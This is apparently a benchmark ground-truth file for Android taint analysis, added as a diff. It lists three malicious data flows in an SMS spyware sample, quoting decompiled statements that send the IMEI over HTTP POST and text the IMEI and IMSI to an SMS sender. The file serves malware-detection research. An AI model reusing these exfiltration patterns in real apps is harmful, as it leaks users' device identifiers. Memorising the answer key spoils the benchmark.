@@ -1,0 +1,271 @@
+{
+  "fileName": "smssend_packageInstaller.apk",
+  "day": "2019-10-31",
+  "findings": [
+    {
+      "source": {
+        "statement": "String value = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();",
+        "methodName": "public static String getImei(Context context)",
+        "className": "install.app.Settings",
+        "lineNo": 280,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());",
+        "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList)",
+        "className": "install.app.MainActivity",
+        "lineNo": 430,
+        "targetName": "getOutputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<java.net.HttpURLConnection: java.io.OutputStream getOutputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "return value;",
+          "methodName": "public static String getImei(Context context)",
+          "className": "install.app.Settings",
+          "lineNo": 288,
+          "ID": 1
+        },
+        {
+          "statement": "this.postUrl = this.postUrl.replace(\"{IMEI}\", Settings.getImei(this));",
+          "methodName": "public void loadData()",
+          "className": "install.app.MainActivity",
+          "lineNo": 235,
+          "ID": 2
+        },
+        {
+          "statement": "loadData();",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "install.app.MainActivity",
+          "lineNo": 116,
+          "ID": 3
+        },
+        {
+          "statement": "sendHttp();",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "install.app.MainActivity",
+          "lineNo": 120,
+          "ID": 4
+        },
+        {
+          "statement": "MainActivity.sendPostRequest(MainActivity.this.postUrl, new LinkedList(), new LinkedList());",
+          "methodName": "public void sendHttp()",
+          "className": "install.app.MainActivity",
+          "lineNo": 511,
+          "ID": 5
+        },
+        {
+          "statement": "sendSimpleHttpRequest(path, \"POST\", paramsList, propertyList);",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList)",
+          "className": "install.app.MainActivity",
+          "lineNo": 477,
+          "ID": 6
+        },
+        {
+          "statement": "HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList);",
+          "methodName": "public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList)",
+          "className": "install.app.MainActivity",
+          "lineNo": 489,
+          "ID": 7
+        },
+        {
+          "statement": "url = new URL(path);",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList)",
+          "className": "install.app.MainActivity",
+          "lineNo": 402,
+          "ID": 8
+        },
+        {
+          "statement": "HttpURLConnection connection = (HttpURLConnection) url.openConnection();",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList)",
+          "className": "install.app.MainActivity",
+          "lineNo": 409,
+          "ID": 9
+        }
+      ],
+      "attributes": {
+        "lifecycle": true,
+        "nonStaticField": true
+      },
+      "ID": 1,
+      "description": "This malicious flow leaks the IMEI via an HTTP POST Request."
+    },
+    {
+      "source": {
+        "statement": "messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);",
+        "methodName": "private SmsMessage[] getSmsMessages(Bundle paramBundle)",
+        "className": "install.app.MainReceiver",
+        "lineNo": 145,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r5)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "SmsManager.getDefault().sendTextMessage(number, null, text, null, null);",
+        "methodName": "public static boolean sendSms(String number, String text)",
+        "className": "install.app.Settings",
+        "lineNo": 473,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r0, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "return messages;",
+          "methodName": "private SmsMessage[] getSmsMessages(Bundle paramBundle)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 148,
+          "ID": 1
+        },
+        {
+          "statement": "SmsMessage[] messages = getSmsMessages(intent.getExtras());",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 26,
+          "ID": 2
+        },
+        {
+          "statement": "SmsMessage smsMessage = messages[i];",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 34,
+          "ID": 3
+        },
+        {
+          "statement": "String text = smsMessage.getMessageBody();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 37,
+          "ID": 4
+        },
+        {
+          "statement": "Settings.sendSms(number, \"ok\");",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 52,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "implicitFlows": true,
+        "lifecycle": true
+      },
+      "ID": 2,
+      "description": "This is is an implicit flow. When a certain SMS is received it sends another SMS."
+    },
+    {
+      "source": {
+        "statement": "String value = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();",
+        "methodName": "public static String getImei(Context context)",
+        "className": "install.app.Settings",
+        "lineNo": 280,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "SmsManager.getDefault().sendTextMessage(number, null, text, null, null);",
+        "methodName": "public static boolean sendSms(String number, String text)",
+        "className": "install.app.Settings",
+        "lineNo": 473,
+        "targetName": "sendTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r0, null, $r2, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (value != null) {",
+          "methodName": "public static String getImei(Context context)",
+          "className": "install.app.Settings",
+          "lineNo": 281,
+          "ID": 1
+        },
+        {
+          "statement": "return value;",
+          "methodName": "public static String getImei(Context context)",
+          "className": "install.app.Settings",
+          "lineNo": 288,
+          "ID": 2
+        },
+        {
+          "statement": "loadData();",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "install.app.MainActivity",
+          "lineNo": 116,
+          "ID": 3
+        },
+        {
+          "statement": "this.postUrl = this.postUrl.replace(\"{IMEI}\", Settings.getImei(this));",
+          "methodName": "public void loadData()",
+          "className": "install.app.MainActivity",
+          "lineNo": 235,
+          "ID": 4
+        },
+        {
+          "statement": "settings = Settings.getSettings();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 41,
+          "ID": 5
+        },
+        {
+          "statement": "Settings.sendSms(number, \"ok\");",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "install.app.MainReceiver",
+          "lineNo": 52,
+          "ID": 6
+        },
+        {
+          "statement": "text = text.replace(\"{IMEI}\", imei).replace(\"{IMSI}\", imsi);",
+          "methodName": "public static boolean sendSms(String number, String text)",
+          "className": "install.app.Settings",
+          "lineNo": 468,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "staticField": true
+      },
+      "ID": 3,
+      "description": "This malicious flow sends device id in a SMS message back to the sender when a certian SMS message is received. "
+    }
+  ]
+}
